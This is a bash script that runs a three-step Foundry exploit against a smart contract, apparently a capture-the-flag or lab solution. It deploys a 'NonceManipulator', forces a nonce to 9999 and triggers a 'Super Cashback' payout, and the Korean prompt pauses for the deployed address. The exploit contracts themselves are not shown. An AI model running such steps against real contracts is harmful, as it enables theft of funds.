#!/bin/bash
set -e

source ../../.env

echo "========== Step 1: Deploy NonceManipulator =========="
forge script script/Deploy.s.sol:Exploit \
    --rpc-url $WEB3_PROVIDER_URI \
    --broadcast \
    -vvvv

echo ""
echo "배포된 NonceManipulator 주소를 .env의 MANIPULATOR_ADDRESS에 입력하세요"
echo "Press Enter to continue..."
read

echo "========== Step 2: Set Nonce to 9999 =========="
forge script script/Deploy.s.sol:ExploitStep2 \
    --rpc-url $WEB3_PROVIDER_URI \
    --broadcast \
    -vvvv

echo "========== Step 3: Trigger Super Cashback =========="
forge script script/Deploy.s.sol:ExploitStep3 \
    --rpc-url $WEB3_PROVIDER_URI \
    --broadcast \
    -vvvv

echo "========== Exploit Complete! =========="